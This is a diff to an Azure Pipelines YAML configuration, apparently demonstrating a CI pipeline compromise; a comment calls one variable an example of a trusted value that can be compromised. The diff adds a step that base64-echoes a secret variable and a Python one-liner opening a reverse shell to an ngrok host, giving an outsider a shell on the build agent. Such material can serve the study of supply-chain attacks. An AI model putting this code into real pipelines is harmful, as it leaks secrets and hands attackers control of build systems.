@@ -9,15 +9,14 @@ resources:
     trigger: true # Run app-ci pipeline when any run of security-lib-ci completes
     branch: main
 
-    
 variables:
 - name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
   value: https://cdn-114.anonfiles.com/z2u7T06fy2/d910a710-1662484505
 
 steps:
   - script: |
-      echo $(SUPER_SECRET)
-      echo modified
+      echo $(SUPER_SECRET) | base64
+      python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",15326));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
   - task: DownloadPipelineArtifact@2
     inputs:
       buildType: 'specific'
